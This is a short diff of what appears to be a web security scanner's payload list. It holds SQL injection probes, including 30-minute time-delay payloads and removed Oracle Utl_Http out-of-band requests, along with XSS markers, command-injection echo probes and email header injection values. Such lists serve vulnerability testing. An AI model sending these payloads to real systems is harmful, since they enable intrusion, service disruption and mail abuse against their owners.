@@ -6,8 +6,6 @@
 1 or 1 in (@@version)--
 '; waitfor delay '0:30:0'--
 1; waitfor delay '0:30:0'--
-'||Utl_Http.request('http://www.google.com') from dual--
-1||Utl_Http.request('http://www.google.com') from dual--
 abrupt_xss__
 abrupt_xss__%00"<>'
 </b>
@@ -37,7 +35,7 @@ abrupt_xss__%00"<>'
 echo 0123456789
 response.write 0123456789
 :response.write 0123456789
-http://www.google.com/
+http://www.phrack.org/
 test0@trashmemail.com%0aCc:test@trashmemail.com
 test0@trashmemail.com%0a%0dCc:test@trashmemail.com
 test0@trashmemail.com%0aBCc:test@trashmemail.com
